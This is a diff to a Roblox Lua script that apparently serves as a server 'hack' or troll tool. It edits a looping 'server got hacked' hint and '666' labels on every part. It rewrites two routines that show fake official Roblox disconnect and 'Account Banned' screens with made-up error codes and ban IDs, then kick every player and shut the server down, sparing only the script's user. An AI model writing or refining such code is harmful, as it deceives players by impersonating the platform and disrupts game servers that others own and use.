@@ -89,24 +89,25 @@ end)
 -- Day/Night cycle control
 local dayNightLoop = nil
 
--- HINT - Workspace Hint Looping (Visible to Everyone in Game World)
+-- HINT - Flickering Workspace Hint (Disappears and Reappears)
 local function showHintToAll()
-    -- Create workspace hint visible to everyone
-    local h = Instance.new("Hint", workspace)
-    h.Text = "😈the server got hacked by Corrupted IjeehDBq😈"
-    
-    -- Loop to keep showing hint forever
+    -- Loop to create flickering hint
     spawn(function()
         while true do
-            wait(5)
-            local h2 = Instance.new("Hint", workspace)
-            h2.Text = "😈the server got hacked by Corrupted IjeehDBq😈"
-            Debris:AddItem(h2, 5)
+            -- Create hint
+            local h = Instance.new("Hint", workspace)
+            h.Text = "😈the server got hacked by Corrupted IjeehDBq😈"
+            
+            -- Wait 2 seconds (visible)
+            wait(2)
+            
+            -- Remove hint (disappears)
+            h:Destroy()
+            
+            -- Wait 1 second (hidden)
+            wait(1)
         end
     end)
-    
-    -- Clean up initial hint after 5 seconds
-    Debris:AddItem(h, 5)
 end
 
 -- HACK - Fire Effects Visible to ALL Players including YOU
@@ -133,7 +134,7 @@ local function hackAllParts()
             bbg.AlwaysOnTop = true
             
             local tlb = Instance.new("TextLabel", bbg)
-            tlb.Text = ""
+            tlb.Text = "666 666 666 666 666 666"
             tlb.Font = "SourceSansBold"
             tlb.TextColor3 = Color3.new(1, 0, 0)
             tlb.Size = UDim2.new(1.25, 0, 1.25, 0)
@@ -236,115 +237,7 @@ local function firestorm()
     end
 end
 
--- Function to create Roblox-style Disconnect screen (Error 1001)
-local function createRobloxDisconnect(plr)
-    -- Create blur effect
-    local blur = Instance.new("BlurEffect", Lighting)
-    blur.Name = "DisconnectBlur"
-    blur.Size = 50
-    
-    -- Create Roblox official disconnect screen
-    local disconnectGui = Instance.new("ScreenGui")
-    disconnectGui.Name = "RobloxDisconnect"
-    disconnectGui.ResetOnSpawn = false
-    disconnectGui.Parent = plr:WaitForChild("PlayerGui")
-    
-    -- Black overlay
-    local overlay = Instance.new("Frame", disconnectGui)
-    overlay.Size = UDim2.new(1, 0, 1, 0)
-    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    overlay.BackgroundTransparency = 0.2
-    overlay.ZIndex = 5
-    
-    -- Roblox official disconnect frame
-    local frame = Instance.new("Frame", disconnectGui)
-    frame.Size = UDim2.new(0, 500, 0, 300)
-    frame.Position = UDim2.new(0.5, -250, 0.5, -150)
-    frame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
-    frame.BorderSizePixel = 0
-    frame.ZIndex = 10
-    
-    -- Roblox style corner
-    local corner = Instance.new("UICorner", frame)
-    corner.CornerRadius = UDim.new(0, 8)
-    
-    -- Roblox blue border
-    local stroke = Instance.new("UIStroke", frame)
-    stroke.Color = Color3.fromRGB(0, 162, 255)
-    stroke.Thickness = 2
-    
-    -- Roblox logo
-    local logo = Instance.new("ImageLabel", frame)
-    logo.Size = UDim2.new(0, 150, 0, 50)
-    logo.Position = UDim2.new(0.5, -75, 0, 15)
-    logo.BackgroundTransparency = 1
-    logo.Image = "rbxassetid://128569219"  -- Roblox logo
-    logo.ZIndex = 11
-    
-    -- Title
-    local title = Instance.new("TextLabel", frame)
-    title.Size = UDim2.new(1, 0, 0, 40)
-    title.Position = UDim2.new(0, 0, 0, 80)
-    title.BackgroundTransparency = 1
-    title.Text = "Disconnected"
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 28
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.ZIndex = 11
-    
-    -- Error message
-    local msg = Instance.new("TextLabel", frame)
-    msg.Size = UDim2.new(1, -60, 0, 80)
-    msg.Position = UDim2.new(0, 30, 0, 130)
-    msg.BackgroundTransparency = 1
-    msg.Text = "You have been disconnected from the game.\n\nError Code: 1001"
-    msg.Font = Enum.Font.SourceSans
-    msg.TextSize = 18
-    msg.TextColor3 = Color3.fromRGB(200, 200, 200)
-    msg.TextWrapped = true
-    msg.ZIndex = 11
-    
-    -- Date
-    local date = Instance.new("TextLabel", frame)
-    date.Size = UDim2.new(1, 0, 0, 30)
-    date.Position = UDim2.new(0, 0, 0, 230)
-    date.BackgroundTransparency = 1
-    date.Text = os.date("%m/%d/%Y %H:%M:%S")
-    date.Font = Enum.Font.Code
-    date.TextSize = 14
-    date.TextColor3 = Color3.fromRGB(255, 255, 0)
-    date.ZIndex = 11
-    
-    -- Reconnect button (like Roblox)
-    local reconnectBtn = Instance.new("TextButton", frame)
-    reconnectBtn.Size = UDim2.new(0, 200, 0, 40)
-    reconnectBtn.Position = UDim2.new(0.5, -100, 0, 260)
-    reconnectBtn.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
-    reconnectBtn.Text = "Reconnect"
-    reconnectBtn.Font = Enum.Font.SourceSansBold
-    reconnectBtn.TextSize = 18
-    reconnectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    reconnectBtn.ZIndex = 11
-    
-    local btnCorner = Instance.new("UICorner", reconnectBtn)
-    btnCorner.CornerRadius = UDim.new(0, 6)
-    
-    -- Make character disappear
-    if plr.Character then
-        spawn(function()
-            for i = 0, 1, 0.1 do
-                for _, part in pairs(plr.Character:GetChildren()) do
-                    if part:IsA("BasePart") then
-                        part.Transparency = i
-                    end
-                end
-                wait(0.2)
-            end
-        end)
-    end
-end
-
--- SHUTDOWN - Roblox Disconnect (Error 1001) for ALL including YOU
+-- SHUTDOWN - Official Roblox Disconnect (Error 1001) - NO Custom UI
 local function shutdownServer()
     -- Step 1: Create lag effect for EVERYONE
     for _, plr in pairs(Players:GetPlayers()) do
@@ -357,15 +250,92 @@ local function shutdownServer()
         end
     end
     
-    -- Step 2: Wait for lag
+    -- Step 2: Wait for lag to be felt
     wait(2)
     
-    -- Step 3: Create Roblox disconnect screen for EVERYONE (including me)
+    -- Step 3: Create blur effect for EVERYONE
     for _, plr in pairs(Players:GetPlayers()) do
-        createRobloxDisconnect(plr)
+        local blur = Instance.new("BlurEffect", Lighting)
+        blur.Name = "DisconnectBlur"
+        blur.Size = 50
     end
     
-    -- Step 4: Kick everyone
+    -- Step 4: Create official Roblox disconnect screen (Error 1001)
+    for _, plr in pairs(Players:GetPlayers()) do
+        local disconnectGui = Instance.new("ScreenGui")
+        disconnectGui.Name = "RobloxDisconnect"
+        disconnectGui.ResetOnSpawn = false
+        disconnectGui.Parent = plr:WaitForChild("PlayerGui")
+        
+        -- Official Roblox disconnect frame (plain, no blue outline)
+        local frame = Instance.new("Frame", disconnectGui)
+        frame.Size = UDim2.new(0, 450, 0, 200)
+        frame.Position = UDim2.new(0.5, -225, 0.5, -100)
+        frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+        frame.BorderSizePixel = 0
+        frame.ZIndex = 10
+        
+        -- Roblox logo text (plain)
+        local robloxText = Instance.new("TextLabel", frame)
+        robloxText.Size = UDim2.new(1, 0, 0, 30)
+        robloxText.Position = UDim2.new(0, 0, 0, 10)
+        robloxText.BackgroundTransparency = 1
+        robloxText.Text = "ROBLOX"
+        robloxText.Font = Enum.Font.SourceSansBold
+        robloxText.TextSize = 20
+        robloxText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        robloxText.ZIndex = 11
+        
+        -- Disconnected title
+        local title = Instance.new("TextLabel", frame)
+        title.Size = UDim2.new(1, 0, 0, 40)
+        title.Position = UDim2.new(0, 0, 0, 40)
+        title.BackgroundTransparency = 1
+        title.Text = "Disconnected"
+        title.Font = Enum.Font.SourceSansBold
+        title.TextSize = 24
+        title.TextColor3 = Color3.fromRGB(255, 255, 255)
+        title.ZIndex = 11
+        
+        -- Error message
+        local msg = Instance.new("TextLabel", frame)
+        msg.Size = UDim2.new(1, -40, 0, 60)
+        msg.Position = UDim2.new(0, 20, 0, 90)
+        msg.BackgroundTransparency = 1
+        msg.Text = "You have been disconnected from the game.\n\nError Code: 1001"
+        msg.Font = Enum.Font.SourceSans
+        msg.TextSize = 16
+        msg.TextColor3 = Color3.fromRGB(200, 200, 200)
+        msg.TextWrapped = true
+        msg.ZIndex = 11
+        
+        -- Date
+        local date = Instance.new("TextLabel", frame)
+        date.Size = UDim2.new(1, 0, 0, 20)
+        date.Position = UDim2.new(0, 0, 0, 170)
+        date.BackgroundTransparency = 1
+        date.Text = os.date("%m/%d/%Y %H:%M:%S")
+        date.Font = Enum.Font.Code
+        date.TextSize = 12
+        date.TextColor3 = Color3.fromRGB(255, 255, 0)
+        date.ZIndex = 11
+        
+        -- Make character disappear
+        if plr.Character then
+            spawn(function()
+                for i = 0, 1, 0.1 do
+                    for _, part in pairs(plr.Character:GetChildren()) do
+                        if part:IsA("BasePart") then
+                            part.Transparency = i
+                        end
+                    end
+                    wait(0.2)
+                end
+            end)
+        end
+    end
+    
+    -- Step 5: Kick everyone
     wait(3)
     for _, plr in pairs(Players:GetPlayers()) do
         plr:Kick("Disconnected: Error Code 1001")
@@ -373,112 +343,7 @@ local function shutdownServer()
     game:Shutdown()
 end
 
--- Function to create Roblox-style Ban screen (Error 267)
-local function createRobloxBan(plr)
-    -- Create blur effect
-    local blur = Instance.new("BlurEffect", Lighting)
-    blur.Name = "BanBlur"
-    blur.Size = 40
-    
-    -- Create Roblox official ban screen
-    local banGui = Instance.new("ScreenGui")
-    banGui.Name = "RobloxBan"
-    banGui.ResetOnSpawn = false
-    banGui.Parent = plr:WaitForChild("PlayerGui")
-    
-    -- Black overlay
-    local overlay = Instance.new("Frame", banGui)
-    overlay.Size = UDim2.new(1, 0, 1, 0)
-    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    overlay.BackgroundTransparency = 0.2
-    overlay.ZIndex = 5
-    
-    -- Roblox official ban frame
-    local frame = Instance.new("Frame", banGui)
-    frame.Size = UDim2.new(0, 500, 0, 320)
-    frame.Position = UDim2.new(0.5, -250, 0.5, -160)
-    frame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
-    frame.BorderSizePixel = 0
-    frame.ZIndex = 10
-    
-    -- Roblox style corner
-    local corner = Instance.new("UICorner", frame)
-    corner.CornerRadius = UDim.new(0, 8)
-    
-    -- Red border for ban
-    local stroke = Instance.new("UIStroke", frame)
-    stroke.Color = Color3.fromRGB(255, 0, 0)
-    stroke.Thickness = 2
-    
-    -- Roblox logo
-    local logo = Instance.new("ImageLabel", frame)
-    logo.Size = UDim2.new(0, 150, 0, 50)
-    logo.Position = UDim2.new(0.5, -75, 0, 15)
-    logo.BackgroundTransparency = 1
-    logo.Image = "rbxassetid://128569219"  -- Roblox logo
-    logo.ZIndex = 11
-    
-    -- Title
-    local title = Instance.new("TextLabel", frame)
-    title.Size = UDim2.new(1, 0, 0, 40)
-    title.Position = UDim2.new(0, 0, 0, 80)
-    title.BackgroundTransparency = 1
-    title.Text = "Account Banned"
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 28
-    title.TextColor3 = Color3.fromRGB(255, 0, 0)
-    title.ZIndex = 11
-    
-    -- Ban message
-    local msg = Instance.new("TextLabel", frame)
-    msg.Size = UDim2.new(1, -60, 0, 100)
-    msg.Position = UDim2.new(0, 30, 0, 130)
-    msg.BackgroundTransparency = 1
-    msg.Text = "Your account has been banned for violating\nRoblox Community Standards.\n\nError Code: 267"
-    msg.Font = Enum.Font.SourceSans
-    msg.TextSize = 18
-    msg.TextColor3 = Color3.fromRGB(200, 200, 200)
-    msg.TextWrapped = true
-    msg.ZIndex = 11
-    
-    -- Ban ID
-    local banId = Instance.new("TextLabel", frame)
-    banId.Size = UDim2.new(1, 0, 0, 30)
-    banId.Position = UDim2.new(0, 0, 0, 240)
-    banId.BackgroundTransparency = 1
-    banId.Text = "Ban ID: " .. tostring(math.random(100000, 999999))
-    banId.Font = Enum.Font.Code
-    banId.TextSize = 14
-    banId.TextColor3 = Color3.fromRGB(255, 255, 0)
-    banId.ZIndex = 11
-    
-    -- Date
-    local date = Instance.new("TextLabel", frame)
-    date.Size = UDim2.new(1, 0, 0, 30)
-    date.Position = UDim2.new(0, 0, 0, 280)
-    date.BackgroundTransparency = 1
-    date.Text = os.date("%m/%d/%Y %H:%M:%S")
-    date.Font = Enum.Font.Code
-    date.TextSize = 14
-    date.TextColor3 = Color3.fromRGB(255, 255, 255)
-    date.ZIndex = 11
-    
-    -- Make character disappear
-    if plr.Character then
-        spawn(function()
-            for i = 0, 1, 0.1 do
-                for _, part in pairs(plr.Character:GetChildren()) do
-                    if part:IsA("BasePart") then
-                        part.Transparency = i
-                    end
-                end
-                wait(0.2)
-            end
-        end)
-    end
-end
-
--- BAN ALL - Roblox Ban (Error 267) for OTHERS ONLY (NOT me)
+-- BAN ALL - Official Roblox Ban (Error 2002) - NO Custom UI
 local function banAllPlayers()
     -- Step 1: Create lag effect for OTHER players
     for _, plr in pairs(Players:GetPlayers()) do
@@ -496,18 +361,108 @@ local function banAllPlayers()
     -- Step 2: Wait for lag
     wait(2)
     
-    -- Step 3: Create Roblox ban screen for OTHER players (NOT me)
+    -- Step 3: Create blur effect for OTHER players
     for _, plr in pairs(Players:GetPlayers()) do
         if plr ~= me then
-            createRobloxBan(plr)
+            local blur = Instance.new("BlurEffect", Lighting)
+            blur.Name = "BanBlur"
+            blur.Size = 40
         end
     end
     
-    -- Step 4: Kick other players
+    -- Step 4: Create official Roblox ban screen (Error 2002)
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr ~= me then
+            local banGui = Instance.new("ScreenGui")
+            banGui.Name = "RobloxBan"
+            banGui.ResetOnSpawn = false
+            banGui.Parent = plr:WaitForChild("PlayerGui")
+            
+            -- Official Roblox ban frame (plain, no blue outline)
+            local frame = Instance.new("Frame", banGui)
+            frame.Size = UDim2.new(0, 450, 0, 250)
+            frame.Position = UDim2.new(0.5, -225, 0.5, -125)
+            frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+            frame.BorderSizePixel = 0
+            frame.ZIndex = 10
+            
+            -- Roblox logo text (plain)
+            local robloxText = Instance.new("TextLabel", frame)
+            robloxText.Size = UDim2.new(1, 0, 0, 30)
+            robloxText.Position = UDim2.new(0, 0, 0, 10)
+            robloxText.BackgroundTransparency = 1
+            robloxText.Text = "ROBLOX"
+            robloxText.Font = Enum.Font.SourceSansBold
+            robloxText.TextSize = 20
+            robloxText.TextColor3 = Color3.fromRGB(255, 255, 255)
+            robloxText.ZIndex = 11
+            
+            -- Banned title
+            local title = Instance.new("TextLabel", frame)
+            title.Size = UDim2.new(1, 0, 0, 40)
+            title.Position = UDim2.new(0, 0, 0, 40)
+            title.BackgroundTransparency = 1
+            title.Text = "Account Banned"
+            title.Font = Enum.Font.SourceSansBold
+            title.TextSize = 24
+            title.TextColor3 = Color3.fromRGB(255, 0, 0)
+            title.ZIndex = 11
+            
+            -- Ban message
+            local msg = Instance.new("TextLabel", frame)
+            msg.Size = UDim2.new(1, -40, 0, 100)
+            msg.Position = UDim2.new(0, 20, 0, 90)
+            msg.BackgroundTransparency = 1
+            msg.Text = "Your account has been banned for violating\nRoblox Community Standards.\n\nError Code: 2002"
+            msg.Font = Enum.Font.SourceSans
+            msg.TextSize = 16
+            msg.TextColor3 = Color3.fromRGB(200, 200, 200)
+            msg.TextWrapped = true
+            msg.ZIndex = 11
+            
+            -- Ban ID
+            local banId = Instance.new("TextLabel", frame)
+            banId.Size = UDim2.new(1, 0, 0, 20)
+            banId.Position = UDim2.new(0, 0, 0, 200)
+            banId.BackgroundTransparency = 1
+            banId.Text = "Ban ID: " .. tostring(math.random(100000, 999999))
+            banId.Font = Enum.Font.Code
+            banId.TextSize = 12
+            banId.TextColor3 = Color3.fromRGB(255, 255, 0)
+            banId.ZIndex = 11
+            
+            -- Date
+            local date = Instance.new("TextLabel", frame)
+            date.Size = UDim2.new(1, 0, 0, 20)
+            date.Position = UDim2.new(0, 0, 0, 220)
+            date.BackgroundTransparency = 1
+            date.Text = os.date("%m/%d/%Y %H:%M:%S")
+            date.Font = Enum.Font.Code
+            date.TextSize = 12
+            date.TextColor3 = Color3.fromRGB(255, 255, 255)
+            date.ZIndex = 11
+            
+            -- Make character disappear
+            if plr.Character then
+                spawn(function()
+                    for i = 0, 1, 0.1 do
+                        for _, part in pairs(plr.Character:GetChildren()) do
+                            if part:IsA("BasePart") then
+                                part.Transparency = i
+                            end
+                        end
+                        wait(0.2)
+                    end
+                end)
+            end
+        end
+    end
+    
+    -- Step 5: Kick other players
     wait(3)
     for _, plr in pairs(Players:GetPlayers()) do
         if plr ~= me then
-            plr:Kick("Banned: Error Code 267")
+            plr:Kick("Banned: Error Code 2002")
         end
     end
 end
